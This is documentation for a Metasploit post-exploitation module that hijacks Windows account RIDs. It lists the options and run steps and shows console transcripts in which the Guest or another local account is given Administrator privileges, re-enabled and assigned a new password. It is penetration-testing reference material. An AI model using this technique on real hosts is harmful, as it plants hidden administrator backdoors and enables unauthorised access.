## Overview

This module will create an entry on the target by modifying some properties of an existing account. It will change the account attributes by setting a Relative Identifier (RID), which should be owned by one existing account on the destination machine.

Taking advantage of some Windows Local Users Management integrity issues, this module will allow to authenticate with one known account credentials (like GUEST account), and access with the privileges of another existing account (like ADMINISTRATOR account), even if the spoofed account is disabled.

By using a `meterpreter` session against a Windows host, the module will try to acquire _**SYSTEM**_ privileges if needed, and will modify some attributes to hijack the permissions of an existing local account and set them to another one.

For more information see [csl.com.co](http://csl.com.co/rid-hijacking/).

## Vulnerable Software

This module has been tested against:

- Windows XP, 2003. (32 bits)
- Windows 8.1 Pro. (64 bits)
- Windows 10. (64 bits)
- Windows Server 2012. (64 bits)

This module was not tested against, but may work on:

- Other versions of windows (x86 and x64).

## Options

- **GETSYSTEM**: Try to get _**SYSTEM**_ privileges on the victim. Default: `false`

- **GUEST_ACCOUNT**: Use the _**GUEST**_ built-in account as the destination of the privileges to be hijacked. Set this account as the _hijacker_. Default: `false`.

- **SESSION**: The session to run this module on. Default: `none`.

- **USERNAME**: Set the user account (_SAM Account Name_) of the victim host which will be the destination of the privileges to be _hijacked_. Set this account as the _hijacker_. If **GUEST_ACCOUNT** option is set to `true`, this parameter will be ignored if defined. Default: `none`.

- **PASSWORD**: Set or change the password of the account defined as the destination of the privileges to be hijacked, either _**GUEST**_ account or the user account set in **USERNAME** option. Set password to the _hijacker_ account. Default: `none`.

- **RID**: Specify the RID number in decimal of the _victim account_. This number should be the RID of an existing account on the target host, no matter if it is disabled (i.e.: The RID of the _**Administrator**_ built-in account is 500). Set the RID owned by the account that will be _hijacked_. Default: `500`
 
## Verification steps

1. Get a `meterpreter` session on some host.
2. Do: `use post/windows/manage/rid_hijack`
3. Do: `set SESSION <SESSION_ID>` replacing <SESSION_ID> with the desired session.
4. Do: `set GET_SYSTEM true`.
5. Do: `set GUEST_ACCOUNT true`.
6. Do: `run`
7. Log in on the victim host with the GUEST account credentials.

## Scenarios
### Assigning Administrator privileges to Guest built-in account.
```
msf post(rid_hijack) > set GETSYSTEM true
GETSYSTEM => true
msf post(rid_hijack) > set GUEST_ACCOUNT true
GUEST_ACCOUNT => true
msf post(rid_hijack) > set SESSION 1
SESSION => 1
msf post(rid_hijack) > run

[*] Checking for SYSTEM privileges on session
[+] Session is already running with SYSTEM privileges
[*] Target OS: Windows 8.1 (Build 9600).
[*] Target account: Guest Account
[*] Target account username: Invitado
[*] Target account RID: 501
[*] Account is disabled, activating...
[+] Target account enabled
[*] Overwriting RID
[+] The RID 500 is set to the account Invitado with original RID 501
[*] Post module execution completed
```
#### Results after login in as the Guest account.

![guest_account](https://user-images.githubusercontent.com/14118912/36490462-4bf84d68-16f6-11e8-811c-bf2d8c42b93d.PNG)

### Assigning Administrator privileges to local custom account.
```
msf post(rid_hijack) > set GETSYSTEM true
GETSYSTEM => true
msf post(rid_hijack) > set GUEST_ACCOUNT false
GUEST_ACCOUNT => false
msf post(rid_hijack) > set USERNAME testuser
USERNAME => testuser
msf post(rid_hijack) > run

[*] Checking for SYSTEM privileges on session
[+] Session is already running with SYSTEM privileges
[*] Target OS: Windows 8.1 (Build 9600).
[*] Checking users...
[+] Found testuser account!
[*] Target account username: testuser
[*] Target account RID: 1002
[+] Target account is already enabled
[*] Overwriting RID
[+] The RID 500 is set to the account testuser with original RID 1002
[*] Post module execution completed
```
#### Results after login in as the _testuser_ account.
![testuser](https://user-images.githubusercontent.com/14118912/36490561-837bd2f0-16f6-11e8-8dc6-53283bb4d9ea.PNG)

### Assigning custom privileges to Guest built-in account and setting new password to Guest.
```
msf post(rid_hijack) > set GUEST_ACCOUNT true
GUEST_ACCOUNT => true
msf post(rid_hijack) > set RID 1002
RID => 1002
msf post(rid_hijack) > set PASSWORD Password.1
PASSWORD => Password.1
msf post(rid_hijack) > run

[*] Checking for SYSTEM privileges on session
[+] Session is already running with SYSTEM privileges
[*] Target OS: Windows 8.1 (Build 9600).
[*] Target account: Guest Account
[*] Target account username: Invitado
[*] Target account RID: 501
[+] Target account is already enabled
[*] Overwriting RID
[+] The RID 1002 is set to the account Invitado with original RID 501
[*] Setting Invitado password to Password.1
[*] Post module execution completed
```
### Assigning custom privileges to local custom account and setting new password to custom account.
```
msf post(rid_hijack) > set GUEST_ACCOUNT false
GUEST_ACCOUNT => false
msf post(rid_hijack) > set USERNAME testuser
USERNAME => testuser
msf post(rid_hijack) > set PASSWORD Password.2
PASSWORD => Password.2
msf post(rid_hijack) > run

[*] Checking for SYSTEM privileges on session
[+] Session is already running with SYSTEM privileges
[*] Target OS: Windows 8.1 (Build 9600).
[*] Checking users...
[+] Found testuser account!
[*] Target account username: testuser
[*] Target account RID: 1002
[+] Target account is already enabled
[*] Overwriting RID
[+] The RID 1002 is set to the account testuser with original RID 1002
[*] Setting testuser password to Password.2
[*] Post module execution completed
```
